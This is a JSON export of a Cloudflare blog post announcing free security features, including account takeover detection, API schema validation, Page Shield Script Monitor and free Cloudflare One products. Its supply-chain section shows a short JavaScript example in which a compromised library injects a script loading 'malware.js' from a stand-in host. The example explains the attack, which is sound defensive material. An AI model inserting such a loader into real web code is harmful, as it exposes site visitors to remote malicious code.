{
	"initialReadingTime": "10",
	"locale": "en-us",
	"localesAvailable": [
		"zh-cn",
		"zh-tw",
		"fr-fr",
		"ja-jp",
		"ko-kr",
		"es-es"
	],
	"post": {
		"authors": [
			{
				"name": "Michael Tremante",
				"slug": "michael-tremante",
				"bio": null,
				"profile_image": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/61VxyepuDMgPc2YC1SLjzq/9c78b998d374520b5ed7435b88659dc6/michael-tremante.jpg",
				"location": null,
				"website": null,
				"twitter": "@MichaelTremante",
				"facebook": null
			},
			{
				"name": "Reid Tatoris",
				"slug": "reid",
				"bio": null,
				"profile_image": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/66Vj67NlvjyTARmLiIWx62/a5abc2b7c5588a150316f203a0d4fd47/reid.jpeg",
				"location": null,
				"website": null,
				"twitter": "@reidtatoris",
				"facebook": null
			}
		],
		"excerpt": "Today, we are taking some big steps forward in our mission to help build a better Internet. Cloudflare is giving everyone free access to 10+ different website and network security products and features.",
		"feature_image": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/63TGtoovZb40m6p78i5d4R/b4956b287eb679c44b6f31dceaa1e1a2/image4.png",
		"featured": false,
		"html": "<p>Anyone using the Internet likely touches Cloudflare’s network on a daily basis, either by accessing a site protected by Cloudflare, using our <a href=\"https://1.1.1.1/dns\"><u>1.1.1.1 resolver</u></a>, or connecting via a network using our Cloudflare One products.</p><p>This puts Cloudflare in a position of great responsibility to make the Internet safer for billions of users worldwide. Today we are providing threat intelligence and more than 10 new security features for free to all of our customers. Whether you are using Cloudflare to protect your website, your home network, or your office, you will find something useful that you can start using with just a few clicks.</p><p>These features are focused around some of the largest growing concerns in cybersecurity, including <a href=\"https://www.cloudflare.com/zero-trust/solutions/account-takeover-prevention/\"><u>account takeover attacks</u></a>, <a href=\"https://blog.cloudflare.com/tag/supply-chain-attacks/\"><u>supply chain attacks</u></a>, <a href=\"https://www.cloudflare.com/learning/security/api/what-is-api-security/\"><u>attacks against API endpoints</u></a>, <a href=\"https://www.cloudflare.com/network-services/products/magic-network-monitoring/\"><u>network visibility</u></a>, and <a href=\"https://www.cloudflare.com/learning/access-management/what-is-dlp/\"><u>data leaks from your network</u></a>.</p><h2>More security for everyone</h2><p>You can read more about each one of these features in the sections below, but we wanted to provide a short summary upfront.</p><p><b>If you are a cyber security enthusiast: </b>you can head over to our <a href=\"http://cloudflare.com/threat-intelligence/\"><u>new Cloudforce One threat intelligence website</u></a> to find out about threat actors, attack campaigns, and other Internet-wide security issues.</p><p><b>If you are a website owner</b>: starting today, all free plans will get access to <a href=\"https://developers.cloudflare.com/waf/analytics/security-analytics/\"><u>Security Analytics</u></a> for their zones. Additionally, we are also making <a href=\"https://developers.cloudflare.com/dns/additional-options/analytics/\"><u>DNS Analytics</u></a> available to everyone via GraphQL.</p><p>Once you have visibility, it’s all about distinguishing good from malicious traffic. All customers get access to always-on <a href=\"https://developers.cloudflare.com/waf/managed-rules/check-for-exposed-credentials/\"><u>account takeover attack detection</u></a>, <a href=\"https://developers.cloudflare.com/api-shield/security/schema-validation/\"><u>API schema validation</u></a> to enforce a positive security model on their API endpoints, and <a href=\"https://developers.cloudflare.com/page-shield/detection/monitor-connections-scripts/\"><u>Page Shield script monitor</u></a> to provide visibility into the third party assets that you are loading from your side and that could be used to perform supply chain-based attacks.</p><p><b>If you are using Cloudflare to protect your people and network</b>: We are going to bundle a number of our Cloudflare One products into a new free offering. This bundle will include the current <a href=\"https://www.cloudflare.com/plans/zero-trust-services/\"><u>Zero Trust products we offer for free</u></a>, and new products like <a href=\"https://www.cloudflare.com/network-services/products/magic-network-monitoring/\"><u>Magic Network Monitoring</u></a> for network visibility, <a href=\"https://www.cloudflare.com/learning/access-management/what-is-dlp/\"><u>Data Loss Prevention</u></a> for sensitive data, and <a href=\"https://www.cloudflare.com/learning/performance/what-is-digital-experience-monitoring/\"><u>Digital Experience Monitoring</u></a> for measuring network connectivity and performance. Cloudflare is the only vendor to offer free versions of these types of products.</p><p><b>If you are a new user: </b>We have new options for authentication. Starting today, we are introducing the option to use Google Authentication to sign up and log into Cloudflare, which will make it easier for some of our customers to login, and reduce dependence on remembering passwords, consequently reducing the risk of their Cloudflare account becoming compromised.</p><p>And now in more detail:</p><h2>Threat Intelligence &amp; Analytics</h2><h3>Cloudforce One</h3><p>Our threat research and operations team, <a href=\"https://blog.cloudflare.com/introducing-cloudforce-one-threat-operations-and-threat-research/\"><u>Cloudforce One</u></a>, is excited to announce the launch of a <a href=\"http://cloudflare.com/threat-intelligence/\"><u>freely accessible dedicated threat intelligence website</u></a>. We will use this site to publish both technical and executive-oriented information on the latest threat actor activity and tactics, as well as insights on emerging malware, vulnerabilities, and attacks.</p><p>We are also publishing two new pieces of threat intelligence, along with a promise for more. Head over to the <a href=\"http://cloudflare.com/threat-intelligence/\"><u>new website</u></a> here to see the latest research, covering an advanced threat actor targeting regional organizations across South and East Asia, as well as the rise of double brokering freight fraud. Future research and data sets will also become available as a new<a href=\"https://developers.cloudflare.com/security-center/indicator-feeds/\"> <u>Custom Indicator Feed</u></a><u> </u>for customers.</p><p><a href=\"http://cloudflare.com/threat-intelligence/\"><u>Subscribe</u></a> to receive email notifications of future threat research.</p><h3>Security Analytics</h3><p>Security Analytics gives you a security lens across <b>all</b> of your HTTP traffic, not only mitigated requests, allowing you to focus on what matters most: traffic deemed malicious but potentially not mitigated. This means that, in addition to using Security Events to view security actions taken by our Application Security suite of products, you can use Security Analytics to review all of your traffic for anomalies or strange behavior and then use the insights gained to craft precise mitigation rules based on your specific traffic patterns. Starting today, we are making this lens available to customers across all plans.</p><p>Free and Pro plan users will now have access to <a href=\"https://dash.cloudflare.com/?to=/:account/:zone/security/analytics\"><u>a new dashboard</u></a> for Security Analytics where you can view a high level overview of your traffic in the Traffic Analysis chart, including the ability to group and filter so that you can zero in on anomalies with ease. You can also see top statistics and filter across a variety of dimensions, including countries, source browsers, source operating systems, HTTP versions, SSL protocol version, cache status, and security actions.</p>\n          <figure class=\"kg-card kg-image-card\">\n          <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/7oBM7D78NDErNNgIPRSJN9/1f9d05f912f55e62911f309fc0197dde/image6.jpg\" alt=\"\" class=\"kg-image\" width=\"1617\" height=\"667\" loading=\"lazy\"/>\n          </figure><h3>DNS Analytics</h3><p>Every user on Cloudflare now has access to <a href=\"https://dash.cloudflare.com/?to=/:account/:zone/dns/analytics\"><u>the new and improved DNS Analytics dashboard</u></a> as well as access to the new DNS Analytics dataset in our <a href=\"https://developers.cloudflare.com/analytics/graphql-api/\"><u>powerful GraphQL API</u></a>. Now, you can easily analyze the DNS queries to your domain(s), which can be useful for troubleshooting issues, detecting patterns and trends, or generating usage reports by applying powerful filters and breaking out DNS queries by source.</p><p>With the <a href=\"https://blog.cloudflare.com/foundation-dns-launch\"><u>launch of Foundation DNS</u></a>, we introduced new DNS Analytics based on GraphQL, but these analytics were previously only available for zones using <a href=\"https://developers.cloudflare.com/dns/foundation-dns/advanced-nameservers/\"><u>advanced nameservers</u></a>. However, due to the deep insight these analytics provide, we felt this feature was something we should make available to everyone. Starting today, the new DNS Analytics based on GraphQL can be accessed on every zone using Cloudflare’s Authoritative DNS service under Analytics in the DNS section.</p>\n          <figure class=\"kg-card kg-image-card\">\n          <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/3LJ4aIFB4pHhHtWeWzYlgV/90d933ee84927fe049ad1d5d6c8b288d/image5.png\" alt=\"\" class=\"kg-image\" width=\"1482\" height=\"928\" loading=\"lazy\"/>\n          </figure><h2>Application threat detection and mitigation</h2><h3>Account takeover detection</h3><p><a href=\"https://techreport.com/statistics/cybersecurity/password-reuse-statistics/\"><u>65% of Internet users</u></a> are vulnerable to account takeover (ATO) due to password reuse and the rising frequency of large data breaches. Helping build a better Internet involves making critical account protection easy and accessible for everyone.</p><p>Starting today, we’re providing robust account security that helps prevent credential stuffing and other ATO attacks to everyone for free — from individual users to large enterprises — making enhanced features like Leaked Credential Checks and ATO detections available at no cost. </p><p>These updates include automatic detection of logins, brute force attack prevention with minimal setup, and access to a comprehensive leaked credentials database of over 15 billion passwords which will contain leaked passwords from the <a href=\"https://haveibeenpwned.com/\"><u>Have I been Pwned (HIBP)</u></a> service in addition to our own database. Customers can take action on the leaked credential requests through Cloudflare’s WAF features like <a href=\"https://developers.cloudflare.com/waf/rate-limiting-rules\"><u>Rate Limiting Rules</u></a> and <a href=\"https://developers.cloudflare.com/waf/custom-rules/\"><u>Custom Rules</u></a>, or they can take action at the origin by enforcing <a href=\"https://www.cloudflare.com/learning/access-management/what-is-multi-factor-authentication/\"><u>multi-factor authentication (MFA)</u></a> or requiring a password reset based on a header sent to the origin.</p><p>Setup is simple: Free plan users get automatic detections, while paid users can activate the new features via one click in the Cloudflare dashboard. For more details on setup and configuration, refer to our <a href=\"https://developers.cloudflare.com/waf/detections/leaked-credentials/\"><u>documentation</u></a> and use it today!</p><h3>API schema validation</h3><p>API traffic <a href=\"https://www.cloudflare.com/2024-api-security-management-report/\"><u>comprises more than half</u></a> of the dynamic traffic on the Cloudflare network. The popularity of APIs has opened up a whole new <a href=\"https://cyware.com/news/unprotected-database-belonging-to-justdial-exposes-personal-information-of-almost-100-million-users-1d5bb7a9\"><u>set</u></a> of <a href=\"https://venturebeat.com/security/t-mobile-data-breach-shows-api-security-cant-be-ignored/\"><u>attack</u></a> <a href=\"https://venturebeat.com/security/twitter-breach-api-attack/\"><u>vectors</u></a>. Cloudflare API Shield’s <a href=\"https://developers.cloudflare.com/api-shield/security/schema-validation/\"><u>Schema Validation</u></a> is the first step to <a href=\"https://blog.cloudflare.com/api-gateway/\"><u>strengthen</u></a> your API security in the face of these new threats.</p><p>Now for the first time, <i>any</i> Cloudflare customer can use Schema Validation to ensure only valid requests to their API make it through to their origin.</p><p>This functionality stops accidental information disclosure due to bugs, stops developers from haphazardly exposing endpoints through a non-standard process, and automatically blocks zombie APIs as your API inventory is kept up-to-date as part of your CI/CD process.</p>\n          <figure class=\"kg-card kg-image-card\">\n          <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/3PMaRYLTwff6D7sdXRysJ7/0b1f23b6fcece592011f7aefdf82f57a/image2.png\" alt=\"\" class=\"kg-image\" width=\"1557\" height=\"1351\" loading=\"lazy\"/>\n          </figure><p>We suggest you use Cloudflare’s <a href=\"https://developers.cloudflare.com/api/operations/api-shield-schema-validation-post-schema\"><u>API</u></a> or Terraform <a href=\"https://developers.cloudflare.com/api-shield/reference/terraform/\"><u>provider</u></a> to add endpoints to Cloudflare API Shield and update the schema after your code’s been released as part of your post-build CI/CD process. That way, API Shield becomes a go-to API inventory tool, and <a href=\"https://developers.cloudflare.com/api-shield/security/schema-validation/\"><u>Schema Validation</u></a> will take care of requests towards your API that you aren’t expecting.</p><p>While APIs are all about integrating with third parties, sometimes integrations are done by loading libraries directly into your application. Next up, we’re helping secure more of the web by protecting users from malicious third party scripts that steal sensitive information from inputs on your pages.</p><h3>Supply chain attack prevention</h3><p>Modern web apps improve their users’ experiences and cut down on developer time through the use of third party JavaScript libraries. Because of its privileged access level to everything on the page, a compromised third party JavaScript library can surreptitiously exfiltrate sensitive information to an attacker without the end user or site administrator realizing it’s happened.</p><p>To counter this threat, we introduced Page Shield <a href=\"https://blog.cloudflare.com/introducing-page-shield/\"><u>three years ago</u></a>. We are now releasing Page Shield’s Script Monitor for free to all our users.</p>\n          <figure class=\"kg-card kg-image-card\">\n          <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/5b6sxHcCLgIAHfb6Qub6NR/517aa9e0f1a5f00388c47dfa69e23c76/image3.png\" alt=\"\" class=\"kg-image\" width=\"1999\" height=\"1843\" loading=\"lazy\"/>\n          </figure><p>With <a href=\"https://dash.cloudflare.com/?to=/:account/:zone/security/page-shield\"><u>Script Monitor</u></a>, you’ll see <i>all</i> JavaScript assets loaded on the page, not just the ones your developers included. This visibility includes scripts dynamically loaded by other scripts! Once an attacker compromises the library, it is trivial to add a new malicious script without changing the context of the original HTML by instead including new code in the existing included JavaScript asset:</p>\n            <pre class=\"language-JavaScript\"><code class=\"language-JavaScript\">// Original library code (trusted)\nfunction someLibraryFunction() {\n    // useful functionality here\n}\n\n// Malicious code added by the attacker\nlet malScript = document.createElement(&#039;script&#039;);\nmalScript.src = &#039;https://example.com/malware.js&#039;;\ndocument.body.appendChild(malScript);</pre></code>\n            <p>Script Monitor was essential when the <a href=\"https://blog.cloudflare.com/polyfill-io-now-available-on-cdnjs-reduce-your-supply-chain-risk\"><u>news broke of the pollyfill.io library</u></a> changing ownership. Script Monitor users had immediate visibility to the scripts loaded on their sites and could quickly and easily understand if they were at risk.</p><p>We’re happy to extend visibility of these scripts to as much of the web as we can by releasing Script Monitor for all customers. Find out how you can get started <a href=\"https://developers.cloudflare.com/page-shield/detection/monitor-connections-scripts/\"><u>here in the docs</u></a>.</p><p>Existing users of Page Shield can immediately filter on the monitored data, knowing whether polyfill.io (or any other library) is used by their app. In addition, we <a href=\"https://blog.cloudflare.com/automatically-replacing-polyfill-io-links-with-cloudflares-mirror-for-a-safer-internet/\"><u>built a polyfill.io rewrite</u></a> in response to the compromised service, which was automatically enabled for Free plans in June 2024.</p><h3>Turnstile as a Google Firebase extension </h3><p>We&#39;re excited to announce the <a href=\"https://developers.cloudflare.com/turnstile/extensions/google-firebase/\"><u>Cloudflare Turnstile App Check Provider for Google Firebase</u></a>, which offers seamless integration without the need for manual setup. This new extension allows developers building mobile or web applications on Firebase to protect their projects from bots using Cloudflare’s CAPTCHA alternative. By leveraging Turnstile&#39;s bot detection and challenge capabilities, you can ensure that only authentic human visitors interact with your Firebase backend services, enhancing both security and user experience. Cloudflare Turnstile, a privacy-focused CAPTCHA alternative, differentiates between humans and bots without disrupting the user experience. Unlike traditional CAPTCHA solutions, which users often abandon, Turnstile operates invisibly and provides various modes to ensure frictionless user interactions.</p><p>The Firebase App Check extension for Turnstile is easy to integrate, allowing developers to quickly enhance app security with minimal setup. This extension is also free with unlimited usage with Turnstile’s free tier. By combining the strengths of Google Firebase&#39;s backend services and Cloudflare’s Turnstile, developers can offer a secure and seamless experience for their users. </p><h2>Cloudflare One</h2><p><a href=\"https://www.cloudflare.com/zero-trust/\"><u>Cloudflare One</u></a> is a comprehensive <a href=\"https://www.cloudflare.com/learning/access-management/what-is-sase/\"><u>Secure Access Service Edge (SASE)</u></a> platform designed to protect and connect people, apps, devices, and networks across the Internet. It combines services such as Zero Trust Network Access (ZTNA), Secure Web Gateway (SWG), and more into a single solution. Cloudflare One can help everyone secure people and networks, manage access control, protect against cyber threats, safeguard their data, and improve the performance of network traffic by routing it through Cloudflare’s global network. It replaces traditional security measures by offering a cloud-based approach to secure and streamline access to corporate resources.</p><p>Everyone now has free access to four new products that have been added to Cloudflare One over the past two years:</p><ul><li><p><a href=\"https://www.cloudflare.com/learning/access-management/what-is-a-casb/\"><u>Cloud Access Security Broker (CASB)</u></a> for mitigating SaaS application risk<i>.</i></p></li><li><p><a href=\"https://www.cloudflare.com/learning/access-management/what-is-dlp/\"><u>Data Loss Prevention (DLP)</u></a> for protecting sensitive data from leaving your network and SaaS applications<i>.</i></p></li><li><p><a href=\"https://www.cloudflare.com/learning/performance/what-is-digital-experience-monitoring/\"><u>Digital Experience Monitoring</u></a> for seeing a user’s experience when they are on any network.</p></li><li><p><a href=\"https://www.cloudflare.com/network-services/products/magic-network-monitoring/\"><u>Magic Network Monitoring</u></a> for seeing all the traffic that flows through your network<i>.</i></p></li></ul><p>This is in addition to the existing network security products already in the Cloudflare One platform:</p><ul><li><p><a href=\"https://www.cloudflare.com/learning/access-management/what-is-ztna/\"><u>Access</u></a> for verifying users’ identity and only letting them use the applications they’re meant to be using.</p></li><li><p><a href=\"https://www.cloudflare.com/learning/access-management/what-is-a-secure-web-gateway/\"><u>Gateway</u></a> for protecting network traffic that both goes out to the public Internet and into your private network.</p></li><li><p><a href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/\"><u>Cloudflare Tunnel</u></a>, our app connectors, which includes both cloudflared and WARP Connector for connecting different applications, servers, and private networks to Cloudflare’s network.</p></li><li><p><a href=\"https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp/\"><u>Cloudflare WARP</u></a>, our device agent, for securely sending traffic from a laptop or mobile device to the Internet.</p></li></ul><p>Anyone with a Cloudflare account will automatically receive 50 free seats across all of these products in their Cloudflare One organization. Visit our <a href=\"https://www.cloudflare.com/plans/zero-trust-services/\"><u>Zero Trust &amp; SASE plans page</u></a> for more information about our free products and to learn about our Pay-as-you-go and Contract plans for teams above 50 members.</p><h2>Authenticating with Google</h2><p>The Cloudflare dashboard itself has become a vital resource that needs to be protected, and we spend a lot of time ensuring Cloudflare user accounts do not get compromised.</p><p>To do this, we have increased security by adding additional authentication methods including app-based two-factor authentication (2FA), passkeys, SSO, and Sign in with Apple. Today we’re adding the ability to sign up and sign in with a Google account.</p><p>Cloudflare supports several authentication workflows tailored to different use cases. While SSO and passkeys are the preferred and most secure methods of authentication, we believe that providing authentication factors that are stronger than passwords will fill a gap and raise overall average security for our users. Signing in with Google makes life easier for our users and prevents them from having to remember yet another password when they’re already browsing the web with a Google identity.</p><p>Sign in with Google is based on the <a href=\"https://oauth.net/2/\"><u>OAuth 2.0</u></a> specification, and allows Google to securely share identifying information about a given identity while ensuring that it is Google providing this information, preventing any malicious entities from impersonating Google.</p><p>This means that we can delegate authentication to Google, preventing zero knowledge attacks directly on this Cloudflare identity.</p><p>Upon coming to the Cloudflare Sign In page, you will be presented with the button below. Clicking on it will allow you to register for Cloudflare, and once you are registered, it will allow you to sign in without typing in a password, using any existing protections you have set on your Google account.</p>\n            <figure class=\"kg-card kg-image-card \">\n            \n            <Image src=\"https://cf-assets.www.cloudflare.com/slt3lc6tev37/6Sse03ivX432bBV01nfyUx/33ea55ee98e047e954f7b599790280b4/Screenshot_2024-09-23_at_16.02.49.png\" alt=\"\" class=\"kg-image\" width=\"1400\" height=\"160\" loading=\"lazy\"/>\n            \n            </figure><p>With the launch of this capability, Cloudflare now uses its own Cloudflare Workers to provide an abstraction layer for <a href=\"https://openid.net/developers/how-connect-works/\"><u>OIDC</u></a>-compatible identity providers (such as GitHub and Microsoft accounts), which means our users can expect to see more <a href=\"https://www.cloudflare.com/learning/access-management/what-is-an-identity-provider/\"><u>identity provider (IdP)</u></a> connection support coming in the future.</p><p>At this time, only new customers signing up with Google will be able to sign in with their Google account, but we will be implementing this for more of our users going forward, with the ability to link/de-link social login providers, and we will be adding additional social login methods. Enterprise users with an established SSO setup will not be able to use this method at this time, and those with an established SSO setup based on Google Workspace will be forwarded to their SSO flow, as we consider how to streamline the Access and IdP policies that have been set up to lock down your Cloudflare environment.</p><p>If you are new to Cloudflare, and have a Google account, it is easier than ever to start using Cloudflare to protect your websites, build a new service, or try any of the other services that Cloudflare provides.</p><h2>A safer Internet</h2><p>One of Cloudflare’s goals has always been to democratize cyber security tools, so everyone can provide content and connect to the Internet safely, even without the resources of large enterprise organizations.</p><p>We have decided to provide a large set of new features for free to all Cloudflare users, covering a wide range of security use cases, for web administrators, network administrators, and cyber security enthusiasts.</p><p><a href=\"https://dash.cloudflare.com/\"><u>Log in to your Cloudflare account</u></a> to start taking advantage of these announcements today. We love feedback on our <a href=\"https://community.cloudflare.com/\"><u>community forums</u></a>, and we commit to improving both existing features and new features moving forward.</p><h2>Watch on Cloudflare TV</h2><div style=\"position: relative; padding-top: 56.25%;\">\n  <iframe\n    src=\"https://customer-rhnwzxvb3mg4wz3v.cloudflarestream.com/6752c8696de5daabf2c5bdba83fb30b9/iframe?poster=https%3A%2F%2Fcustomer-rhnwzxvb3mg4wz3v.cloudflarestream.com%2F6752c8696de5daabf2c5bdba83fb30b9%2Fthumbnails%2Fthumbnail.jpg%3Ftime%3D0m2s%26height%3D600\"\n    loading=\"lazy\"\n    style=\"border: none; position: absolute; top: 0; left: 0; height: 100%; width: 100%;\"\n    allow=\"accelerometer; gyroscope; autoplay; encrypted-media; picture-in-picture;\"\n    allowfullscreen=\"true\"\n  ></iframe>\n</div><p></p>",
		"id": "3hUMWCRTsPTuqyUixn3aXp",
		"localeList": {
			"name": "A safer Internet with Cloudflare: free threat intelligence, analytics, and new threat detections Loc",
			"enUS": "English for Locale",
			"zhCN": "Translated for Locale",
			"zhHansCN": "No Page for Locale",
			"zhTW": "Translated for Locale",
			"frFR": "Translated for Locale",
			"deDE": "No Page for Locale",
			"itIT": "No Page for Locale",
			"jaJP": "Translated for Locale",
			"koKR": "Translated for Locale",
			"ptBR": "No Page for Locale",
			"esLA": "No Page for Locale",
			"esES": "Translated for Locale",
			"enAU": "No Page for Locale",
			"enCA": "No Page for Locale",
			"enIN": "No Page for Locale",
			"enGB": "No Page for Locale",
			"idID": "No Page for Locale",
			"ruRU": "No Page for Locale",
			"svSE": "No Page for Locale",
			"viVN": "No Page for Locale",
			"plPL": "No Page for Locale",
			"arAR": "No Page for Locale",
			"nlNL": "No Page for Locale",
			"thTH": "No Page for Locale",
			"trTR": "No Page for Locale",
			"heIL": "No Page for Locale",
			"lvLV": "No Page for Locale",
			"etEE": "No Page for Locale",
			"ltLT": "No Page for Locale"
		},
		"meta_description": "Today, we are taking some big steps forward in our mission to help build a better Internet. Cloudflare is giving everyone free access to 10+ different website and network security products and features.",
		"metadata": {
			"title": "A safer Internet with Cloudflare: free threat intelligence, analytics, and new threat detections",
			"description": "Today, we are taking some big steps forward in our mission to help build a better Internet. Cloudflare is giving everyone free access to 10+ different website and network security products and features.",
			"imgPreview": "https://cf-assets.www.cloudflare.com/slt3lc6tev37/XnNxePLKdNSOFCHnO9vQ9/642c59a62667d3c81915d6a5f68c9c85/A_safer_Internet_with_Cloudflare-_free_threat_intelligence__analytics__and_new_threat_detections-OG.png"
		},
		"primary_author": {},
		"published_at": "2024-09-24T14:00+01:00",
		"slug": "a-safer-internet-with-cloudflare",
		"tags": [
			{
				"id": "1Cv5JjXzKWKEA10JdYbXu1",
				"name": "Birthday Week",
				"slug": "birthday-week"
			},
			{
				"id": "6Mp7ouACN2rT3YjL1xaXJx",
				"name": "Security",
				"slug": "security"
			},
			{
				"id": "3iAX3DmDBEfSj3TULqvhPD",
				"name": "CASB",
				"slug": "casb"
			},
			{
				"id": "4yBlHkuMJq9VSFd341CkxY",
				"name": "DLP",
				"slug": "dlp"
			},
			{
				"id": "1T8cuJRyo3f60s8eaRdY6Y",
				"name": "Data Loss Prevention",
				"slug": "data-loss-prevention"
			},
			{
				"id": "6hv2Z69PGr0qU411KfQNUE",
				"name": "Threat Intelligence",
				"slug": "threat-intelligence"
			},
			{
				"id": "J61Eszqn98amrYHq4IhTx",
				"name": "Zero Trust",
				"slug": "zero-trust"
			},
			{
				"id": "4Z2oveL0P0AeqGa5lL4Vo1",
				"name": "Cloudflare One",
				"slug": "cloudflare-one"
			},
			{
				"id": "6stQ7u3dAyBmZithR7rBBD",
				"name": "Page Shield",
				"slug": "page-shield"
			},
			{
				"id": "1oreuc8ahaGdJNbxhdwSrH",
				"name": "Leaked Credential Checks",
				"slug": "leaked-credential-checks"
			},
			{
				"id": "2UI24t7uddD0CIIUJCu1f4",
				"name": "SASE",
				"slug": "sase"
			}
		],
		"title": "A safer Internet with Cloudflare: free threat intelligence, analytics, and new threat detections",
		"updated_at": "2024-09-30T02:33:21.013Z",
		"url": "https://blog.cloudflare.com/a-safer-internet-with-cloudflare"
	},
	"translations": {
		"posts.by": "By",
		"footer.gdpr": "GDPR",
		"lang_blurb1": "This post is also available in {lang1}.",
		"lang_blurb2": "This post is also available in {lang1} and {lang2}.",
		"lang_blurb3": "This post is also available in {lang1}, {lang2} and {lang3}.",
		"footer.blurb": "Cloudflare's connectivity cloud protects <a target='_blank' href='https://www.cloudflare.com/network-services/' rel='noreferrer'>entire corporate networks</a>, helps customers build <a target='_blank' href='https://workers.cloudflare.com/' rel='noreferrer'>Internet-scale applications efficiently</a>, accelerates any <a target='_blank' href='https://www.cloudflare.com/performance/accelerate-internet-applications/' rel='noreferrer'>website or Internet application</a>, <a target='_blank' href='https://www.cloudflare.com/ddos/' rel='noreferrer'>wards off DDoS attacks</a>, keeps <a target='_blank' href='https://www.cloudflare.com/application-security/' rel='noreferrer'>hackers at bay</a>, and can help you on <a target='_blank' href='https://www.cloudflare.com/products/zero-trust/' rel='noreferrer'>your journey to Zero Trust</a>.<br/><br/>Visit <a target='_blank' href='https://one.one.one.one/' rel='noreferrer'>1.1.1.1</a> from any device to get started with our free app that makes your Internet faster and safer.<br/><br/>To learn more about our mission to help build a better Internet, <a target='_blank' href='https://www.cloudflare.com/learning/what-is-cloudflare/' rel='noreferrer'>start here</a>. If you&apos;re looking for a new career direction, check out <a target='_blank' href='http://www.cloudflare.com/careers' rel='noreferrer'>our open positions</a>.",
		"footer.press": "Press",
		"header.title": "The Cloudflare Blog",
		"search.clear": "Clear",
		"search.filter": "Filter",
		"search.source": "Source",
		"footer.careers": "Careers",
		"footer.company": "Company",
		"footer.support": "Support",
		"footer.the_net": "theNet",
		"search.filters": "Filters",
		"footer.our_team": "Our team",
		"footer.webinars": "Webinars",
		"page.more_posts": "More posts",
		"posts.time_read": "{time} min read",
		"search.language": "Language",
		"footer.community": "Community",
		"footer.resources": "Resources",
		"footer.solutions": "Solutions",
		"footer.trademark": "Trademark",
		"header.subscribe": "Subscribe",
		"footer.compliance": "Compliance",
		"footer.free_plans": "Free plans",
		"footer.impact_ESG": "Impact/ESG",
		"posts.follow_on_X": "Follow on X",
		"footer.help_center": "Help center",
		"footer.network_map": "Network Map",
		"header.please_wait": "Please Wait",
		"page.related_posts": "Related posts",
		"search.result_stat": "Results <strong>{search_range}</strong> of <strong>{search_total}</strong> for <strong>{search_keyword}</strong>",
		"footer.case_studies": "Case Studies",
		"footer.connect_2024": "Connect 2024",
		"footer.terms_of_use": "Terms of Use",
		"footer.white_papers": "White Papers",
		"footer.cloudflare_tv": "Cloudflare TV",
		"footer.community_hub": "Community Hub",
		"footer.compare_plans": "Compare plans",
		"footer.contact_sales": "Contact Sales",
		"header.contact_sales": "Contact Sales",
		"header.email_address": "Email Address",
		"page.error.not_found": "Page not found",
		"footer.developer_docs": "Developer docs",
		"footer.privacy_policy": "Privacy Policy",
		"footer.request_a_demo": "Request a demo",
		"page.continue_reading": "Continue reading",
		"footer.analysts_report": "Analyst reports",
		"footer.for_enterprises": "For enterprises",
		"footer.getting_started": "Getting Started",
		"footer.learning_center": "Learning Center",
		"footer.project_galileo": "Project Galileo",
		"pagination.newer_posts": "Newer Posts",
		"pagination.older_posts": "Older Posts",
		"posts.social_buttons.x": "Discuss on X",
		"search.source_location": "Source/Location",
		"footer.about_cloudflare": "About Cloudflare",
		"footer.athenian_project": "Athenian Project",
		"footer.become_a_partner": "Become a partner",
		"footer.cloudflare_radar": "Cloudflare Radar",
		"footer.network_services": "Network services",
		"footer.trust_and_safety": "Trust & Safety",
		"header.get_started_free": "Get Started Free",
		"page.search.placeholder": "Search Cloudflare",
		"footer.cloudflare_status": "Cloudflare Status",
		"footer.cookie_preference": "Cookie Preferences",
		"header.valid_email_error": "Must be valid email.",
		"footer.connectivity_cloud": "Connectivity cloud",
		"footer.developer_services": "Developer services",
		"footer.investor_relations": "Investor relations",
		"page.not_found.error_code": "Error Code: 404",
		"footer.logos_and_press_kit": "Logos & press kit",
		"footer.application_services": "Application services",
		"footer.get_a_recommendation": "Get a recommendation",
		"posts.social_buttons.reddit": "Discuss on Reddit",
		"footer.sse_and_sase_services": "SSE and SASE services",
		"page.not_found.outdated_link": "You may have used an outdated link, or you may have typed the address incorrectly.",
		"footer.report_security_issues": "Report Security Issues",
		"page.error.error_message_page": "Sorry, we can't find the page you are looking for.",
		"header.subscribe_notifications": "Subscribe to receive notifications of new posts:",
		"footer.cloudflare_for_campaigns": "Cloudflare for Campaigns",
		"header.subscription_confimation": "Subscription confirmed. Thank you for subscribing!",
		"posts.social_buttons.hackernews": "Discuss on Hacker News",
		"footer.diversity_equity_inclusion": "Diversity, equity & inclusion",
		"footer.critical_infrastructure_defense_project": "Critical Infrastructure Defense Project"
	}
}